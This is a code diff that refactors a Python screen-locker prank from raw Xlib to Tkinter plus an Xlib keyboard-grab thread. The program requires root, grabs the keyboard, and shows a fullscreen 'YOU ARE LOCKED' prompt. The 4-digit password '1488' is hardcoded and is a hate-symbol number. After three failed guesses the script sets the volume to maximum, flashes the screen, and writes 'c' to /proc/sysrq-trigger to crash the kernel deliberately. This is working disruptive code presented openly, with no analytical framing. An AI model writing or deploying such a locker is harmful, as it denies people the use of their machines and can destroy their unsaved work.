@@ -1,11 +1,16 @@
 #!/usr/bin/env python3
-import os, sys, time, threading, subprocess
+import os, sys, time, threading, subprocess, queue
 from Xlib import X, XK
 from Xlib.display import Display
+import tkinter as tk
 
 PASSWORD = "1488"
 MAX_ATTEMPTS = 3
 attempts_left = MAX_ATTEMPTS
+input_buffer = ""
+
+# ---------- очередь для передачи обновлений из Xlib‑потока в GUI ----------
+gui_queue = queue.Queue()
 
 def play_loud_sound():
     subprocess.run(["amixer", "set", "Master", "100%"], capture_output=True)
@@ -15,121 +20,124 @@ def trigger_kernel_panic():
     with open("/proc/sysrq-trigger", "w") as f:
         f.write("c")
 
-class GrabLocker:
+# ---------- GUI (Tkinter) ----------
+class LockGUI:
     def __init__(self):
-        self.display = Display()
-        self.screen = self.display.screen()
-        self.root = self.screen.root
-        self.width = self.screen.width_in_pixels
-        self.height = self.screen.height_in_pixels
+        self.root = tk.Tk()
+        self.root.title("Lock")
+        self.root.attributes('-fullscreen', True)
+        self.root.attributes('-topmost', True)
+        self.root.overrideredirect(True)
+        self.root.configure(bg='black')
+        self.root.protocol("WM_DELETE_WINDOW", lambda: None)
 
-        self.colormap = self.screen.default_colormap
-        self.color_black = self.screen.black_pixel
-        self.color_green = self.colormap.alloc_color(0, 65535, 0).pixel
-        self.color_red = self.colormap.alloc_color(65535, 0, 0).pixel
-        self.color_white = self.colormap.alloc_color(65535, 65535, 65535).pixel
+        self.header = tk.Label(self.root, text="YOU ARE LOCKED. GUESS 4-DIGIT PASSWORD",
+                               fg='green', bg='black', font=("Courier", 24, "bold"))
+        self.header.pack(pady=30)
 
-        self.window = self.root.create_window(
-            0, 0, self.width, self.height, 0,
-            self.screen.root_depth,
-            X.InputOutput,
-            X.CopyFromParent,
-            background_pixel=self.color_black,
-            event_mask=X.KeyPressMask | X.KeyReleaseMask | X.ExposureMask,
-            override_redirect=True,
-        )
-        self.window.map()
-        self.display.flush()
+        self.attempts_label = tk.Label(self.root, text=f"ATTEMPTS LEFT: {attempts_left}",
+                                       fg='green', bg='black', font=("Courier", 16))
+        self.attempts_label.pack(pady=10)
 
-        self.window.grab_keyboard(True, X.GrabModeAsync, X.GrabModeAsync, X.CurrentTime)
-        self.display.flush()
+        self.input_display = tk.Label(self.root, text="> ",
+                                      fg='green', bg='black', font=("Courier", 18))
+        self.input_display.pack(pady=10)
 
-        self.gc = self.window.create_gc(foreground=self.color_green, background=self.color_black)
-        self.font = self.display.open_font("fixed")
+        self.keypad = tk.Label(self.root, text="1 2 3\n4 5 6\n7 8 9\n   0",
+                               fg='green', bg='black', font=("Courier", 16))
+        self.keypad.pack(pady=20)
 
-        self.input_buffer = ""
-        self.running = True
-
-    def draw_text(self, text, y, color="green"):
-        if color == "green":
-            self.gc.change(foreground=self.color_green)
-        elif color == "red":
-            self.gc.change(foreground=self.color_red)
-        elif color == "white":
-            self.gc.change(foreground=self.color_white)
-        # draw_text expects list of strings; we'll pass a list with a single string
-        self.window.draw_text(self.font, self.gc, self.width//2 - 200, y, [text])
-        self.display.flush()
-
-    def redraw_screen(self):
-        self.window.clear_area(0, 0, self.width, self.height)
-        self.draw_text("YOU ARE LOCKED. GUESS 4-DIGIT PASSWORD", 50, "green")
-        self.draw_text(f"ATTEMPTS LEFT: {attempts_left}", 100, "green")
-        stars = "*" * len(self.input_buffer)
-        self.draw_text(f"> {stars}", 150, "green")
-        keys = ["1 2 3", "4 5 6", "7 8 9", "   0"]
-        for i, line in enumerate(keys):
-            self.draw_text(line, 210 + i*40, "green")
-
-    def start(self):
-        self.redraw_screen()
-        while self.running:
-            event = self.display.next_event()
-            if event.type == X.KeyPress:
-                self.handle_keypress(event)
-            elif event.type == X.Expose:
-                self.redraw_screen()
-
-    def handle_keypress(self, event):
-        global attempts_left
-        keysym = self.display.keycode_to_keysym(event.detail, 0)
-        if keysym == XK.XK_Return:
-            self.check_password()
-        elif keysym == XK.XK_BackSpace:
-            self.input_buffer = self.input_buffer[:-1]
-            self.redraw_screen()
-        elif keysym in (XK.XK_0, XK.XK_1, XK.XK_2, XK.XK_3, XK.XK_4,
-                        XK.XK_5, XK.XK_6, XK.XK_7, XK.XK_8, XK.XK_9):
-            if len(self.input_buffer) < 4:
-                self.input_buffer += chr(keysym)
-                self.redraw_screen()
-
-    def check_password(self):
-        global attempts_left
-        if self.input_buffer == PASSWORD:
-            self.cleanup()
-            sys.exit(0)
-        else:
-            self.input_buffer = ""
-            attempts_left -= 1
-            if attempts_left <= 0:
-                self.running = False
-                self.trigger_failure()
-            else:
-                self.redraw_screen()
-
-    def trigger_failure(self):
-        threading.Thread(target=play_loud_sound, daemon=True).start()
-        self.flash_screen()
-        threading.Timer(5.0, trigger_kernel_panic).start()
+    def update_screen(self):
+        """Обновляет все изменяемые элементы экрана (вызывается из главного потока)"""
+        self.attempts_label.config(text=f"ATTEMPTS LEFT: {attempts_left}")
+        stars = "*" * len(input_buffer)
+        self.input_display.config(text=f"> {stars}")
 
     def flash_screen(self):
+        """Мигание красным/белым 10 раз"""
         for i in range(10):
-            pixel = self.color_red if i % 2 == 0 else self.color_white
-            self.window.change_attributes(background_pixel=pixel)
-            self.display.flush()
+            color = 'red' if i % 2 == 0 else 'white'
+            self.root.configure(bg=color)
+            self.root.update()
             time.sleep(0.1)
-        self.window.change_attributes(background_pixel=self.color_black)
-        self.display.flush()
+        self.root.configure(bg='black')
+        self.root.update()
 
     def cleanup(self):
-        self.display.ungrab_keyboard(X.CurrentTime)
-        self.window.destroy()
-        self.display.close()
+        self.root.destroy()
 
+# ---------- Захват клавиатуры (Xlib) ----------
+def keyboard_grabber(disp, win):
+    global attempts_left, input_buffer
+    # Захватываем клавиатуру на корневое окно
+    root_win = disp.screen().root
+    root_win.grab_keyboard(True, X.GrabModeAsync, X.GrabModeAsync, X.CurrentTime)
+    disp.flush()
+
+    while True:
+        event = disp.next_event()
+        if event.type == X.KeyPress:
+            keysym = disp.keycode_to_keysym(event.detail, 0)
+            if keysym == XK.XK_Return:
+                # Enter — проверка пароля
+                if input_buffer == PASSWORD:
+                    gui_queue.put("quit")
+                    break
+                else:
+                    input_buffer = ""
+                    attempts_left -= 1
+                    gui_queue.put("update")
+                    if attempts_left <= 0:
+                        gui_queue.put("failure")
+                        break
+            elif keysym == XK.XK_BackSpace:
+                input_buffer = input_buffer[:-1]
+                gui_queue.put("update")
+            elif keysym in (XK.XK_0, XK.XK_1, XK.XK_2, XK.XK_3, XK.XK_4,
+                            XK.XK_5, XK.XK_6, XK.XK_7, XK.XK_8, XK.XK_9):
+                if len(input_buffer) < 4:
+                    input_buffer += chr(keysym)
+                    gui_queue.put("update")
+            # Все остальные клавиши просто игнорируются
+        elif event.type == X.KeyRelease:
+            pass
+
+    # Освобождаем клавиатуру
+    root_win.ungrab_keyboard(X.CurrentTime)
+    disp.close()
+
+# ---------- Главный поток ----------
 if __name__ == "__main__":
     if os.geteuid() != 0:
         print("Run as root (sudo).")
         sys.exit(1)
-    locker = GrabLocker()
-    locker.start()
+
+    gui = LockGUI()
+    disp = Display()
+
+    # Поток для захвата клавиатуры
+    xlib_thread = threading.Thread(target=keyboard_grabber, args=(disp, gui.window), daemon=True)
+    xlib_thread.start()
+
+    # Главный цикл Tkinter + обработка команд из очереди
+    def process_gui_queue():
+        try:
+            while True:
+                msg = gui_queue.get_nowait()
+                if msg == "quit":
+                    gui.cleanup()
+                    sys.exit(0)
+                elif msg == "update":
+                    gui.update_screen()
+                elif msg == "failure":
+                    gui.update_screen()
+                    # Запускаем сценарий провала
+                    threading.Thread(target=play_loud_sound, daemon=True).start()
+                    gui.flash_screen()
+                    threading.Timer(5.0, trigger_kernel_panic).start()
+        except queue.Empty:
+            pass
+        gui.root.after(50, process_gui_queue)
+
+    process_gui_queue()
+    gui.root.mainloop()
